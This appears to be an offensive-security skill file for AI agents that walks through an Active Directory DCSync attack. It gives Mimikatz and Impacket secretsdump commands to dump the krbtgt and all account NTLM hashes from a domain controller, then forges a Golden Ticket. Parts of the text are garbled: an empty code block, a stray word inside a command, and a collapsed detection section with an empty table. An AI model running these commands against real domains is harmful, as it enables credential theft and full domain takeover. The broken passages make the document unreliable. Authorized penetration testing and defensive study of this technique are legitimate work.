---
name: "ad-dcsync-attack"
description: ">"
---

# Ad Dcsync Attack

*Sourced from akashrpatil-awesome-offensive-security-skills*

# Active Directory DCSync Attack

## When to Use
- When an attacker has compromised an account or group with the highly privileged `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` rights (often Domain Admins or maliciously delegated accounts).
- To stealthily extract NTLM hashes (including the `krbtgt` account hash) directly from Active Directory over the network, avoiding the need to execute code or drop malware directly on a Domain Controller.


## Prerequisites
- Authorized scope and rules of engagement for the target environment
- Appropriate tools installed on the attack/analysis platform
- Understanding of the target technology stack and architecture
- Documentation template ready for findings and evidence capture

## Workflow

### Phase 1: Identifying the Target (krbtgt) and Access Rights

```bash
# ```

### Phase 2: Execution via Mimikatz (Windows)

```text
# privilege::debug
lsadump::dcsync /domain:lab.local /user:krbtgt

# lsadump::dcsync /domain:lab.local /all /csv
```

### Phase 3: Execution via Impacket (Linux/Network)

```bash
# impacket-secretsdump -just-dc-user krbtgt lab.local/administrator:Password123@10.10.10.10

# beautifully impacket-secretsdump lab.local/administrator:Password123@10.10.10.10
```

### Phase 4: Utilizing the Material (Golden Ticket)

```bash
# impacket-ticketer -nthash <KRBTGT_NTLM_HASH> -domain-sid <DOMAIN_SID> -domain lab.local Administrator
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Identify Rights ] --> B{Possess Rights ]}
    B -->|Yes| C[Execute DCSync ]
    B -->|No| D[Escalate Privileges ]
    C --> E[Extract Hashes ]
```

## 🔵 Blue Team Detection & Defense
- **Monitor Directory Replication events**: **Review ACLs for Replication Rights (BloodHound / ADAC)**: **Network Segmentation & Monitoring**: Key Concepts
| Concept | Description |
|---------|-------------|
## Output Format
```
Ad Dcsync Attack — Assessment Report
============================================================
Target: [Target identifier]
Assessor: [Operator name]
Date: [Assessment date]
Scope: [Authorized scope]
MITRE ATT&CK: [Relevant technique IDs]

Findings Summary:
  [Finding 1]: [Severity] — [Brief description]
  [Finding 2]: [Severity] — [Brief description]

Detailed Results:
  Phase 1: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

  Phase 2: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

Risk Rating: [Critical/High/Medium/Low/Informational]
Recommendations:
  1. [Immediate remediation step]
  2. [Long-term hardening measure]
  3. [Monitoring/detection improvement]
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- AdSecurity: [Mimikatz DCSync Usage, Exploitation, and Detection](https://adsecurity.org/?p=1729)
- HackTricks: [DCSync](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)

